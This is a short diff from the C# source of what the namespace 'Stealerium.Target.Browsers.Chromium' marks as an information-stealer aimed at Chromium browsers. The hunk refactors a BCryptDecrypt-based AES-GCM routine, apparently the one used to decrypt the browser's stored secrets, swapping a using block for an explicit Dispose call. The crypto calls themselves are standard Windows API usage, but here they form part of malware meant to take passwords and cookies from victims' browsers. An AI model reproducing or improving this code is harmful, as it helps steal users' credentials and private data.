@@ -17,30 +17,28 @@ namespace Stealerium.Target.Browsers.Chromium
             byte[] plainText;
 
             var authInfo = new CbCrypt.AuthenticatedCipherModeInfo(iv, aad, authTag);
-            using (authInfo)
-            {
-                var ivData = new byte[MaxAuthTagSize(hAlg)];
+            var ivData = new byte[MaxAuthTagSize(hAlg)];
+            var plainTextSize = 0;
 
-                var plainTextSize = 0;
+            var status = CbCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData,
+                ivData.Length, null, 0, ref plainTextSize, 0x0);
 
-                var status = CbCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData,
-                    ivData.Length, null, 0, ref plainTextSize, 0x0);
+            if (status != CbCrypt.ErrorSuccess)
+                throw new CryptographicException(
+                    $"BCrypt.BCryptDecrypt() (get size) failed with status code: {status}");
 
-                if (status != CbCrypt.ErrorSuccess)
-                    throw new CryptographicException(
-                        $"BCrypt.BCryptDecrypt() (get size) failed with status code: {status}");
+            plainText = new byte[plainTextSize];
 
-                plainText = new byte[plainTextSize];
+            status = CbCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length,
+                plainText, plainText.Length, ref plainTextSize, 0x0);
 
-                status = CbCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length,
-                    plainText, plainText.Length, ref plainTextSize, 0x0);
+            if (status == CbCrypt.StatusAuthTagMismatch)
+                throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
 
-                if (status == CbCrypt.StatusAuthTagMismatch)
-                    throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
+            if (status != CbCrypt.ErrorSuccess)
+                throw new CryptographicException($"BCrypt.BCryptDecrypt() failed with status code:{status}");
 
-                if (status != CbCrypt.ErrorSuccess)
-                    throw new CryptographicException($"BCrypt.BCryptDecrypt() failed with status code:{status}");
-            }
+            authInfo.Dispose();
 
             CbCrypt.BCryptDestroyKey(hKey);
             Marshal.FreeHGlobal(keyDataBuffer);
